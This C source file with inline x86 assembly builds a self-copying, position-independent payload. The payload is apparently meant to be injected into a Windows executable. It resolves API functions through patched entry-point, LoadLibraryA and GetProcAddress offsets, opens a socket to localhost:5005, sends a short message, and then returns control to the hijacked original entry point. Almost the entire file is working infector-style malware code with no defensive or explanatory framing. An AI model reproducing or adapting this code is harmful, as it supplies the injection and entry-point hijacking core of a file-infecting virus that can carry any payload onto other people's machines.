/*
	jakub trzebiatowski
	vs 2012, link with: 
	/SECTION:.text,ERWKP 

	ps.
	https://www.youtube.com/watch?v=_GZB_nP4uWE
*/

#include <stdint.h>

#define GET_PARAM_(f) PARAM_ ## f : mov eax, 1337; 

#define PAYLOAD_HEAP_SIZE 0x500

struct addrinfo
{
    int                 ai_flags;       // AI_PASSIVE, AI_CANONNAME, AI_NUMERICHOST
    int                 ai_family;      // PF_xxx
    int                 ai_socktype;    // SOCK_xxx
    int                 ai_protocol;    // 0 or IPPROTO_xxx for IPv4 and IPv6
    size_t              ai_addrlen;     // Length of ai_addr
    char *              ai_canonname;   // Canonical name for nodename
    _Field_size_bytes_(ai_addrlen) struct sockaddr *   ai_addr;        // Binary address
    struct addrinfo *   ai_next;        // Next structure in linked list
};



/*

param1 - absolute offset to original entry point
param2 - absolute offset to LoadLibraryA
param3 - absolute offset to GetProcAddress

access params via GET_PARAM_(1) , GET_PARAM_(2) ...
*/
int32_t SelfCopyingFunction(uint8_t* dst, 
							uint32_t param1, uint32_t param2, uint32_t param3)
{
	uint8_t* payLoad;
	uint32_t payLoad_length;

	// filling heap
	#define VAR_1_OFFSET						0
	#define VAR_1_LEN							16
	strcpy((char*)dst+VAR_1_OFFSET,				"ws2_32.dll");

	#define VAR_2_OFFSET						(VAR_1_OFFSET+VAR_1_LEN)
	#define VAR_2_LEN							16
	strcpy((char*)dst+VAR_2_OFFSET,				"connect");

	#define VAR_3_OFFSET						(VAR_2_OFFSET+VAR_2_LEN)
	#define VAR_3_LEN							16
	strcpy((char*)dst+VAR_3_OFFSET,				"WSAStartup");

	#define VAR_4_OFFSET						(VAR_3_OFFSET+VAR_3_LEN)
	#define VAR_4_LEN							16
	strcpy((char*)dst+VAR_4_OFFSET,				"getaddrinfo");
		
	#define VAR_5_LEN							16
	#define VAR_5_OFFSET						(VAR_4_OFFSET+VAR_4_LEN)
	strcpy((char*)dst+VAR_5_OFFSET,				"socket");

	#define VAR_6_LEN							16
	#define VAR_6_OFFSET						(VAR_5_OFFSET+VAR_5_LEN)
	strcpy((char*)dst+VAR_6_OFFSET,				"send");


	#define VAR_7_LEN							0x20
	#define VAR_7_OFFSET						(VAR_6_OFFSET+VAR_6_LEN)
	struct addrinfo *hints						= (addrinfo*)(dst+VAR_7_OFFSET);
	hints->ai_family							= 0;		// AF_UNSPEC	;
    hints->ai_socktype							= 1;		// SOCK_STREAM	;
    hints->ai_protocol							= 6;		// IPPROTO_TCP	;

	#define VAR_8_LEN							0x4
	#define VAR_8_OFFSET						(VAR_7_OFFSET+VAR_7_LEN)
	uint16_t *wVersionRequested					= (uint16_t*)(dst+VAR_8_OFFSET);
	*wVersionRequested							= 0x02020202;	// MAKEWORD(2,2);

	// wsaData
	#define VAR_9_LEN							0x190
	#define VAR_9_OFFSET						(VAR_8_OFFSET+VAR_8_LEN)
	
	// socket
	#define VAR_10_LEN							0x4
	#define VAR_10_OFFSET						(VAR_9_OFFSET+VAR_9_LEN)

	// addrinfo result PTR
	#define VAR_11_LEN							0x4
	#define VAR_11_OFFSET						(VAR_10_OFFSET+VAR_10_LEN)

	// hostname
	#define VAR_12_LEN							16
	#define VAR_12_OFFSET						(VAR_11_OFFSET+VAR_11_LEN)
	strcpy((char*)dst+VAR_12_OFFSET,			"localhost");

	// port
	#define VAR_13_LEN							16
	#define VAR_13_OFFSET						(VAR_12_OFFSET+VAR_12_LEN)
	strcpy((char*)dst+VAR_13_OFFSET,			"5005");

	// send buffer
	#define VAR_14_LEN							16
	#define VAR_14_OFFSET						(VAR_13_OFFSET+VAR_13_LEN)
	strcpy((char*)dst+VAR_14_OFFSET,			"hello:D!");
	#define SEND_BUFFER_SIZE					VAR_14_LEN		




	_asm
	{
		jmp end;
start:
		GET_PARAM_(1)							;
		mov edx, eax							;
		call foo
foo:
		pop ebx									;	get adress of foo
		mov ecx, foo							;
		sub ecx, start							;	calc start-foo offset	
		sub ebx, ecx							;	calc addr of start
		mov [ebx-8], ebx						;	 store start addr on pseudo stack
		#define ENTRY_POINT_ORIGINAL [ebx-12]
		mov ENTRY_POINT_ORIGINAL, ebx			;	 store start addr on pseudo stack
		sub ENTRY_POINT_ORIGINAL, edx			;	calc addr of original entry point store original entry point addr

		;LoadLibraryA
		#define LOADLIBRARY [ebx-16]
		GET_PARAM_(2)							;	
		mov edx, [ebx-8]						;
		sub edx, eax							;
		mov edx, [edx]							;	dereference pointer
		mov LOADLIBRARY, edx					;	store addr of LoadLibraryA

		;GetProcAddress
		#define GETPROCADDRESS [ebx-20]
		GET_PARAM_(3)							;	
		mov edx, [ebx-8]						;
		sub edx, eax							;
		mov edx, [edx]							;	dereference pointer
		mov GETPROCADDRESS, edx					;	store addr to pointer of GetProcAddress

		;;;;;;;;;;;;;
		; payload
		
		#define	LIB_NAME						ebx-PAYLOAD_HEAP_SIZE+VAR_1_OFFSET
		#define CONNECT_NAME					ebx-PAYLOAD_HEAP_SIZE+VAR_2_OFFSET
		#define WSASTARTUP_NAME					ebx-PAYLOAD_HEAP_SIZE+VAR_3_OFFSET
		#define	GETADDRINFO_NAME				ebx-PAYLOAD_HEAP_SIZE+VAR_4_OFFSET
		#define SOCKET_NAME						ebx-PAYLOAD_HEAP_SIZE+VAR_5_OFFSET
		#define SEND_NAME						ebx-PAYLOAD_HEAP_SIZE+VAR_6_OFFSET
		#define ADDRINFO_HINTS					ebx-PAYLOAD_HEAP_SIZE+VAR_7_OFFSET
		#define VERSION_REQUESTED				ebx-PAYLOAD_HEAP_SIZE+VAR_8_OFFSET
		#define WSADATA							ebx-PAYLOAD_HEAP_SIZE+VAR_9_OFFSET
		#define SOCKET							ebx-PAYLOAD_HEAP_SIZE+VAR_10_OFFSET
		#define ADDRINFO_RESULT_PTR				ebx-PAYLOAD_HEAP_SIZE+VAR_11_OFFSET
		#define HOSTNAME						ebx-PAYLOAD_HEAP_SIZE+VAR_12_OFFSET
		#define PORT							ebx-PAYLOAD_HEAP_SIZE+VAR_13_OFFSET
		#define SEND_BUFFER						ebx-PAYLOAD_HEAP_SIZE+VAR_14_OFFSET

		; load library
		lea eax, [LIB_NAME]						; retrv addr
		push eax								; _In_ LPCTSTR lpFileName
		call LOADLIBRARY						; 
		#define HMODULE [ebx-32]		
		mov HMODULE, eax						; store lib handle

		; recv addr of connect
		lea eax, [CONNECT_NAME]					; retrv addr
		push eax								; _In_ LPCSTR  lpProcName
		push HMODULE							; _In_ HMODULE hModule
		call GETPROCADDRESS						; 
		#define CONNECT [ebx-24]
		mov CONNECT, eax						; store f ptr

		; recv addr of WSAStartup
		lea eax, [WSASTARTUP_NAME]				;
		push eax								;
		push HMODULE							; 
		call GETPROCADDRESS						; 
		#define WSASTARTUP [ebx-28]
		mov WSASTARTUP, eax						;

		; recv addr of getaddrinfo 
		lea eax, [GETADDRINFO_NAME]				;
		push eax								;
		push HMODULE							;
		call GETPROCADDRESS						; 
		#define GETADDRINFO [ebx-36]
		mov GETADDRINFO, eax					;

		; recv addr of create socket 
		lea eax, [SOCKET_NAME]					;
		push eax								;
		push HMODULE							;	
		call GETPROCADDRESS						; 
		#define CREATESOCKET [ebx-40]
		mov CREATESOCKET, eax					;

		; recv addr of send
		lea eax, [SEND_NAME]					;
		push eax								;
		push HMODULE							;
		call GETPROCADDRESS						;
		#define SEND [ebx-44]
		mov SEND, eax							;



		; wsastartup
		lea eax, [WSADATA]						;	get addr of wsadata			
		push eax								;	
		push [VERSION_REQUESTED]				;	push socket version
		call WSASTARTUP
		test eax,eax	
		jnz quit								;   if fail relative jump to quit
		
		; getadrinfo
		lea eax, [ADDRINFO_RESULT_PTR]			;
		push eax								;
		lea eax, [ADDRINFO_HINTS]				;
		push eax								;
		lea eax, [PORT]							;
		push eax
		lea eax, [HOSTNAME]
		push eax								;
		call GETADDRINFO						;


		; for(ptr=result; ptr != NULL ;ptr=ptr->ai_next)
connect:
		; createsocket
		mov ecx, [ADDRINFO_RESULT_PTR]				; retreive poiter to a ADDRINFO_RESULT
		push [ecx+12]								; ai_pro
		push [ecx+8]								; ai_socktype	
		push [ecx+4]								; ai_family
		call CREATESOCKET							;
		mov [SOCKET], eax							;
		test eax, eax								;
		jz quit										; if fail relative jump to quit

		; connect

		mov ecx, [ADDRINFO_RESULT_PTR]				; retreive poiter to a ADDRINFO_RESULT
		mov eax, [ecx+16]							; ai_addrlen
		push [ecx+16]								;
		mov eax, [ecx+24]							; ai_addr
		push [ecx+24]								;
		mov eax, [SOCKET]							;	
		push [SOCKET]								;
		call CONNECT								;	
		test eax, eax								;
		jz connected								; relative jump if connected

		; addr = addr->next
		mov ecx, [ADDRINFO_RESULT_PTR]				;
		mov eax, [ecx+28]							; ai_next
		mov [ADDRINFO_RESULT_PTR], eax				; addr = addr->next
		test eax, eax								;
		jnz connect									; continue if addr != null

		; could not connect
		jz quit										; else quit

connected:

		; send data
		push 0										;
		push SEND_BUFFER_SIZE						;
		lea eax, [SEND_BUFFER]						;
		push eax									;
		push [SOCKET]								;
		call SEND									;
		add eax, 1									;
		test eax, eax								;
		//jnz connected								; while sent


		;;;;;;;;;;;;;
quit: 
	jmp ENTRY_POINT_ORIGINAL				

end:
		// calc payload length
		mov eax, end;
		sub eax, start;
		mov payLoad_length, eax;
		mov eax, start;
		mov payLoad, eax;

		// self modyfing, updating params
		mov eax, param1;
		mov PARAM_1+1, eax;

		mov eax, param2;
		mov PARAM_2+1, eax;

		mov eax, param3;
		mov PARAM_3+1, eax;

	};


	memcpy(dst + PAYLOAD_HEAP_SIZE, payLoad, payLoad_length);

	return 1337;
}